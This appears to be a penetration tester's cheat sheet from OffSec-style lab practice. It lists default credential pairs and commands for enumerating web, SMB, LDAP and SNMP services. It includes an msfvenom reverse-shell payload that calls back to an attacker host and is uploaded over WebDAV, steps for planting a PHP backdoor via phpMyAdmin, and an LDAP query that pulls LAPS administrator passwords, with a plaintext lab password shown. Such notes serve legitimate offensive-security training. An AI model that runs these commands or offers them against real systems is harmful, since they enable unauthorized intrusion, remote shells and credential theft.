# Default Credentials
admin:admin
admin:password
admin:null
root:root
root:password
root:null
platform:platform


# HTTP/HTTPS(80,8080,8000,443...)

## wappalyzer

## gobuster
```bash
gobuster dir -u http://192.168.216.122/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```



## nikto: find webdav
```bash
nikto -h http://192.168.222.122
```


## cadaver(username,password required)
```bash
# first create a reverse shell(asp, aspx)
└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.176 LPORT=4444 -f aspx > shell.aspx

# connect to cadaver
cadaver http://10.3.20.218/webdav
put /root/offsec/shell.aspx
```


## wpscan: wordpress
```bash

```


## phpmyadmin: default password
- use default password(password can be null)
- upload php uploader: https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f
- upload simple-backdoor.php through SQL



# PORT 445: SMb
## crackmapexec smb
```bash
crackmapexec smb 192.168.216.165 -u 'enox' -p '' --shares
```


# PORT 389,3268: LDAP
## ldapsearch: focus on samaccount and description
```bash
# unauthenticated
ldapsearch -x -H ldap://192.168.216.122 -D 'hutch.offsec'  -b 'DC=hutch,DC=offsec'

# authenticated(LAPS found from SYSVOL)
ldapsearch -x -H 'ldap://192.168.216.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```



# SNMP(161)
```bash
snmpwalk -c public -v1 192.168.x.x
snmpwalk -v2c -c public 192.168.195.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
```


# File Read Exploit
- /etc/passwd
- find password files for other program that's running(for authenticated exploit)
